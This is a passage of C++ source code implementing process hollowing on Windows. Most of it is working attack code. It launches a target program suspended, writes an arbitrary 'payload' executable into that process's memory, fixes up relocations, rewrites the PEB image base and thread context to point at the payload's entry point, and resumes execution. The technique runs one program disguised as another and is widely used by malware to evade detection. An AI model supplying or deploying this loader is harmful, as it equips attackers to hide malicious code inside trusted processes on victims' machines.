    // Flush instruction cache of the CPU to ensure instruction-cache coherence
    if (!FlushInstructionCache(lpPI->hProcess, (LPVOID)lpAllocAddress,
                               lpNT->OptionalHeader.SizeOfImage)) {
        std::cout << "\nFlush instruction cache failed. Error code: "
                  << GetLastError();
        return false;
    }

    DWORD prevSuspendedCount = ResumeThread(lpPI->hThread);
    if (prevSuspendedCount == static_cast<DWORD>(-1)) {
        std::cout << "\nResumeThread failed. Error: " << GetLastError();
        return false;
    } else if (prevSuspendedCount > 1) {
        std::cout << "\nResumeThread succeeded, but the thread has not resumed yet. Error: "
                  << GetLastError();
        return false;
    }

    return true;
}

bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
                  const LPVOID lpFileContent, const DWORD dwFileSize) {
    // Get headers
    const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpNT = (PIMAGE_NT_HEADERS64)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    std::cout << "\n[+] Size of image: "
              << (SIZE_T)lpNT->OptionalHeader.SizeOfImage;

    bool bNeedReloc = false;
    LPVOID lpAllocAddress;

    // Try to alloc in the ImageBase
    lpAllocAddress = VirtualAllocEx(
        lpPI->hProcess, (LPVOID)((uintptr_t)lpNT->OptionalHeader.ImageBase),
        (SIZE_T)lpNT->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (lpAllocAddress == NULL) bNeedReloc = true;

    // If previous allocation fails, lpAddress = NULL
    if (bNeedReloc) {
        lpAllocAddress = VirtualAllocEx(
            lpPI->hProcess, NULL, (SIZE_T)lpNT->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (lpAllocAddress == NULL) {
            std::cout << "\nVirtualAllocEx failed. Error code: "
                      << GetLastError();
            return false;
        }
    }

    std::cout << "\n[+] Alloc address: " << (uintptr_t)lpAllocAddress;

    // Delta
    const DWORD64 DeltaImageBase =
        (DWORD64)lpAllocAddress - lpNT->OptionalHeader.ImageBase;

    std::cout << "\n[+] Delta: " << DeltaImageBase;

    // Set new ImageBase
    if (bNeedReloc) lpNT->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;

    std::cout << "\n[+] Size of headers: "
              << (SIZE_T)lpNT->OptionalHeader.SizeOfHeaders;

    // Write headers
    if (!WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpFileContent,
                            (SIZE_T)lpNT->OptionalHeader.SizeOfHeaders, NULL)) {
        std::cout << "\nWrite headers on allocated space failed. Error code: "
                  << GetLastError();
        return false;
    }

    // Setup variables for .reloc
    IMAGE_DATA_DIRECTORY ImgDataReloc;

    if (bNeedReloc)
        ImgDataReloc = GetReloc64(lpFileContent);  // The reloc table

    if (bNeedReloc && (ImgDataReloc.VirtualAddress == 0 ||
        ImgDataReloc.Size == 0)) {
        std::cout << "\nUnable to retrieve reloc table. Error code: "
                  << GetLastError();
        return false;
    }

    PIMAGE_SECTION_HEADER lpRelocSection =
        nullptr;  // The address of the section containing reloc

    // Write sections
    std::cout << "\n[+] Number of sections: "
              << lpNT->FileHeader.NumberOfSections;
    for (int i = 0; i < lpNT->FileHeader.NumberOfSections; ++i) {
        const auto lpImageSectionHeader =
            (PIMAGE_SECTION_HEADER)((uintptr_t)lpNT + 4 +
                                    sizeof(IMAGE_FILE_HEADER) +
                                    lpNT->FileHeader.SizeOfOptionalHeader +
                                    (i * sizeof(IMAGE_SECTION_HEADER)));

        std::cout << "\n[+] Section " << i + 1;

        std::cout << "\nSection + Previous data = "
                  << lpImageSectionHeader->VirtualAddress +
                         lpImageSectionHeader->Misc.VirtualSize;
        std::cout << "\nSize of allocation: "
                  << (SIZE_T)lpNT->OptionalHeader.SizeOfImage;
        // Check if the size of the section is larger than the allocated space
        // lpImageSectionHeader->VirtualAddress is RVA, not VA
        if ((lpImageSectionHeader->VirtualAddress +
             lpImageSectionHeader->SizeOfRawData) >
            (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
            std::cout
                << "\nThe section's size is larger than the allocated space.";
            return false;
        }

        if((lpImageSectionHeader->PointerToRawData + lpImageSectionHeader->SizeOfRawData) > dwFileSize)
        {
            std::cout << "\nSection exceeds file size limit.";
            return false;
        }

        if (bNeedReloc &&
            ImgDataReloc.VirtualAddress >=
                (uintptr_t)lpImageSectionHeader->VirtualAddress &&
            ImgDataReloc.VirtualAddress <
                (lpImageSectionHeader->VirtualAddress +
                 lpImageSectionHeader->Misc.VirtualSize))
            lpRelocSection = lpImageSectionHeader;

        if (!WriteProcessMemory(
                lpPI->hProcess,
                (LPVOID)((uintptr_t)lpAllocAddress +
                         lpImageSectionHeader->VirtualAddress),
                (LPVOID)((uintptr_t)lpFileContent +
                         lpImageSectionHeader->PointerToRawData),
                (SIZE_T)lpImageSectionHeader->SizeOfRawData, NULL)) {
            std::cout << "\nSection " << i + 1
                      << " was not written successfully. Error code  "
                      << GetLastError();
            return false;
        }
    }

    if (bNeedReloc && lpRelocSection == nullptr) {
        std::cout << "\nCannot find relocation section.";
        return false;
    }

    // Fixing addresses
    if (bNeedReloc) {
        std::cout << "\n=====FIXING ADDRESSES=====\n";
        DWORD64 dwRelocOffset = 0;
        DWORD64 dwRemainingByte = ImgDataReloc.Size;
        int iNumOfBlocks = 0;
        while (dwRelocOffset < ImgDataReloc.Size) {
            // IMAGE_BASE_RELOCATION has a member called VirtualAddress
            // This indicates the start of a page (4KB) that has addresses to be
            // fixed, and these addresses are in this block
            if(dwRemainingByte < 8)
            {
                std::cout << "\nCannot read the next block. The remaining byte is smaller than 8 bytes.";
                return false;
            }

            std::cout << "\n[+] Block " << ++iNumOfBlocks;
            const auto RelocBlock =
                (PIMAGE_BASE_RELOCATION)(DWORD64)((uintptr_t)lpFileContent +
                                                  dwRelocOffset +
                                                  lpRelocSection
                                                      ->PointerToRawData +
                                                  (ImgDataReloc.VirtualAddress -
                                                   lpRelocSection
                                                       ->VirtualAddress));  // Get the reloc block
            std::cout << "\nGetting reloc block done.";

            dwRelocOffset += sizeof(IMAGE_BASE_RELOCATION);

            std::cout << "\n[+] Reloc Offset: " << dwRelocOffset;

            std::cout << "\n- Size of block: " << RelocBlock->SizeOfBlock;

            if(RelocBlock->SizeOfBlock < 0x8)
            {
                std::cout << "\nNo size for the entries.";
                return false;
            }
            else if(RelocBlock->SizeOfBlock > dwRemainingByte)
            {
                std::cout << "\nSizeOfBlock is larger than remaining bytes.";
                return false;
            }
            
            dwRemainingByte -= sizeof(IMAGE_BASE_RELOCATION);            
    
            DWORD dwNumOfEntries = (DWORD)(RelocBlock->SizeOfBlock - 0x8) /
                               0x2;  // 0x2 is the size of IMAGE_RELOC_ENTRY

            if(dwNumOfEntries * 0x2 != (RelocBlock->SizeOfBlock - 0x8))
            {
                std::cout << "\nThe size for entries is not valid.";
                return false;
            }

            std::cout << "\n[+] Num of entries: " << dwNumOfEntries;
            for (DWORD i = 0; i < dwNumOfEntries; ++i) {
                const auto RelocEntry =
                    (PIMAGE_RELOCATION_ENTRY)(DWORD64)((uintptr_t)
                                                           lpFileContent +
                                                       lpRelocSection
                                                           ->PointerToRawData +
                                                       (ImgDataReloc
                                                            .VirtualAddress -
                                                        lpRelocSection
                                                            ->VirtualAddress) +
                                                       dwRelocOffset);
                dwRelocOffset += 0x2;
                dwRemainingByte -= 0x2;
                // Padding entry, no need to intervene
                if (RelocEntry->Type == IMAGE_REL_BASED_ABSOLUTE) continue;

                DWORD dwOffset = DWORD(RelocBlock->VirtualAddress + RelocEntry->Offset);
                if(dwOffset > lpNT->OptionalHeader.SizeOfImage)
                {
                    std::cout << "\nThe location to be value-fixed exceeds the size of image.";
                    return false;
                }
    
                const auto ptrToTheAddressToFix = (uintptr_t)lpAllocAddress + dwOffset;
                
                DWORD64 dwFixedAddress;

                if (!ReadProcessMemory(
                        lpPI->hProcess, (LPVOID)ptrToTheAddressToFix,
                        (LPVOID)&dwFixedAddress, sizeof(DWORD64), NULL)) {
                    std::cout << "\nCannot read the address to be fixed.";
                    return false;
                }

                if (RelocEntry->Type == IMAGE_REL_BASED_DIR64) {
                    dwFixedAddress += DeltaImageBase;
                }

                else {
                    std::cout << "\nRelocation type not supported.";
                    return false;
                }

                if (!WriteProcessMemory(
                        lpPI->hProcess, (LPVOID)ptrToTheAddressToFix,
                        (LPVOID)&dwFixedAddress, sizeof(DWORD64), NULL)) {
                    std::cout << "\nCannot patch new address. Error code: "
                              << GetLastError();
                    return false;
                }
            }
        }
    }

    // Set new entry point (Rcx) and write the new image base (Rdx + 0x10)
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nCannot retrieve context.";
        return false;
    }

    if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)ctx.Rdx + 0x10),
                            (LPVOID)&lpAllocAddress, sizeof(DWORD64), NULL)) {
        std::cout << "\nCannot set new image base in PEB";
        return false;
    }

    ctx.Rcx = (DWORD64)((uintptr_t)lpAllocAddress +
                        lpNT->OptionalHeader.AddressOfEntryPoint);

    if (!SetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nCannot set new thread context.";
        return false;
    }

    // Flush instruction cache of the CPU to ensure instruction-cache coherence
    if (!FlushInstructionCache(lpPI->hProcess, (LPVOID)lpAllocAddress,
                               lpNT->OptionalHeader.SizeOfImage)) {
        std::cout << "\nFlush instruction cache failed. Error code: "
                  << GetLastError();
        return false;
    }

    DWORD prevSuspendedCount = ResumeThread(lpPI->hThread);
    if (prevSuspendedCount == static_cast<DWORD>(-1)) {
        std::cout << "\nResumeThread failed. Error: " << GetLastError();
        return false;
    } else if (prevSuspendedCount > 1) {
        std::cout << "\nResumeThread succeeded, but the thread has not resumed yet. Error: "
                  << GetLastError();
        return false;
    }

    return true;
}

int main(const int argc, char* argv[]) {
    /*********************************/
    /**====CREATE PAYLOAD ON RAM====**/
    /*********************************/

    LPSTR lpSourceImage;  // Payload
    LPSTR lpTargetProcess;

    if (argc == 3) {
        lpSourceImage = argv[1];
        lpTargetProcess = argv[2];
    }

    else {
        std::cout
            << "\nNeed exactly two paths of PE to proceed Process Hollowing.";
        return -1;
    }

    std::cout << "\n[+] Payload: " << lpSourceImage;
    std::cout << "\n[+] Target: " << lpTargetProcess;

    DWORD dwFileSize;

    const LPVOID lpFileContent = GetFileContent(
        lpSourceImage, dwFileSize);  // Assign payload on RAM and get address
    if (lpFileContent == nullptr) {
        std::cout << "\nGet address of payload on RAM failed.";
        return -1;
    }

    if (!isValidPE(lpFileContent,
                   dwFileSize))  // Check if the payload is a valid PE file
    {
        std::cout << "\nThe payload is not satisfied as a PE file.";
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return -1;
    }

    /*******************************/
    /*====CREATE TARGET PROCESS====*/
    /*******************************/

    STARTUPINFOA SI;
    PROCESS_INFORMATION PI;

    // Clear initiated data
    ZeroMemory(&SI, sizeof(SI));
    ZeroMemory(&PI, sizeof(PI));
    // Set the size of SI
    SI.cb = sizeof(SI);

    if (!CreateProcessA(lpTargetProcess, nullptr, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
        std::cout << "\nCreate target process failed.";
        CloseProcessAndCleanPayload(&PI, lpFileContent);
        return -1;
    }

    USHORT ProcessMachine, NativeMachine;
    if (!IsWow64Process2(PI.hProcess, &ProcessMachine,
                         &NativeMachine))  // WOW64: x86 emulator on x64 arch
    {
        std::cout << "\nGetting target's arch failed.";
        CloseProcessAndCleanPayload(&PI, lpFileContent);
        return -1;
    }

    bool bTarget32;
    if (ProcessMachine == IMAGE_FILE_MACHINE_I386) {
        bTarget32 = true;
    } else if (ProcessMachine == IMAGE_FILE_MACHINE_UNKNOWN) {
        if (NativeMachine == IMAGE_FILE_MACHINE_AMD64) {
            bTarget32 = false;
        } else {
            std::cout << "\nNativeMachine value is not supported.";
            CloseProcessAndCleanPayload(&PI, lpFileContent);
            return -1;
        }
    } else {
        std::cout << "\nProcessMachine value is not supported";
        CloseProcessAndCleanPayload(&PI, lpFileContent);
        return -1;
    }

    // Get address info of the target
    ProcessAddressInformation PAI;
    if (bTarget32)
        PAI = GetProcAddrInfo32(&PI);
    else
        PAI = GetProcAddrInfo64(&PI);

    if (PAI.lpProcessPEBAddress == nullptr ||
        PAI.lpProcessImageBaseAddress == nullptr) {
        std::cout << "\nGetting process address info failed.";
        CloseProcessAndCleanPayload(&PI, lpFileContent);
        return -1;
    }

    /*****************************/
    /*====CHECK COMPATIBILITY====*/
    /*****************************/

    /**
     *What to check:
     * 1. PE 32 or 64
     * 2. Subsystem
     */

    /*32 or 64*/
    PayloadArch plArch = GetPayloadArch(lpFileContent);
    if(plArch == PayloadArch::unsupported)
    {
        std::cout << "\nUnsupported payload's architecture.";
        CloseProcessAndCleanPayload(&PI, lpFileContent);
        return -1;
    }

    bool bPayload32 = (plArch == PayloadArch::x86)? true : false;

    if(bPayload32 != bTarget32)
    {
        std::cout << "\nArchitecture of payload and target process is not compatible.";
        CloseProcessAndCleanPayload(&PI, lpFileContent);
        return -1; 
    }

    /*Check the size of optional header*/
    if(bPayload32)
    {
        if(!isValidOptHeader32(lpFileContent))
        {
            std::cout << "\nOptionalHeader size is not eligible.";
            CloseProcessAndCleanPayload(&PI, lpFileContent);
            return -1;
        }
    }
    else
    {
        if(!isValidOptHeader64(lpFileContent))
        {
            std::cout << "\nOptionalHeader size is not eligible.";
            CloseProcessAndCleanPayload(&PI, lpFileContent);
            return -1; 
        }
    }

    /*Subsystem*/
    std::cout << "\n=====SUBSYSTEM=====\n";
    DWORD dwPayloadSubsystem;
    if (bPayload32)
        dwPayloadSubsystem = GetPayloadSubsystem32(lpFileContent);
    else
        dwPayloadSubsystem = GetPayloadSubsystem64(lpFileContent);

    if (dwPayloadSubsystem == (DWORD)-1) {
        std::cout << "\nPayload's subsystem is not valid.";
        CloseProcessAndCleanPayload(&PI, lpFileContent);
        return -1;
    }

    DWORD dwTargetSubsystem;
    if (bTarget32)
        dwTargetSubsystem =
            GetTargetSubsystem32(PI.hProcess, PAI.lpProcessImageBaseAddress);
    else
        dwTargetSubsystem =
            GetTargetSubsystem64(PI.hProcess, PAI.lpProcessImageBaseAddress);

    if (dwTargetSubsystem == (DWORD)-1) {
        std::cout << "\nTarget's subsystem is not valid.";
        CloseProcessAndCleanPayload(&PI, lpFileContent);
        return -1;
    }

    std::cout << "\n[+] Payload's subsystem: " << dwPayloadSubsystem;
    std::cout << "\n[+] Target's subsystem: " << dwTargetSubsystem;

    if (dwTargetSubsystem != dwPayloadSubsystem) {
        std::cout << "\nTarget's subsystem and payload's subsystem is not "
                     "compatible.";
        CloseProcessAndCleanPayload(&PI, lpFileContent);
        return -1;
    }

    /***********************************/
    /*LOADING THE PAYLOAD AND EXECUTING*/
    /***********************************/

    bool bPayloadHasReloc;
    if (bPayload32)
        bPayloadHasReloc = HasReloc32(lpFileContent);
    else
        bPayloadHasReloc = HasReloc64(lpFileContent);

    // Executing
    if (bPayload32 && !bPayloadHasReloc) {
        std::cout << "\n=====PE32=====\n";
        if (RunPE32(&PI, lpFileContent, dwFileSize)) {
            std::cout << "\nProcess Hollowing successfully executed.";
            CloseHandleAndCleanPayload(&PI, lpFileContent);
            return 0;
        }

    }

    else if (bPayload32 && bPayloadHasReloc) {
        std::cout << "\n=====PEReloc32=====\n";
        if (RunPEReloc32(&PI, lpFileContent, dwFileSize)) {
            std::cout << "\nProcess Hollowing successfully executed.";
            CloseHandleAndCleanPayload(&PI, lpFileContent);
            return 0;
        }
    }

    if (!bPayload32 && !bPayloadHasReloc) {
        std::cout << "\n=====PE64=====\n";
        if (RunPE64(&PI, lpFileContent, dwFileSize)) {
            std::cout << "\nProcess Hollowing successfully executed.";
            CloseHandleAndCleanPayload(&PI, lpFileContent);
            return 0;
        }

    } else if (!bPayload32 && bPayloadHasReloc) {
        std::cout << "\n=====PEReloc64=====\n";
        if (RunPEReloc64(&PI, lpFileContent, dwFileSize)) {
            std::cout << "\nProcess Hollowing successfully executed.";
            CloseHandleAndCleanPayload(&PI, lpFileContent);
            return 0;
        }
    }

    std::cout << "\nProcess Hollowing failed.";
    CloseProcessAndCleanPayload(&PI, lpFileContent);

    return -1;
}
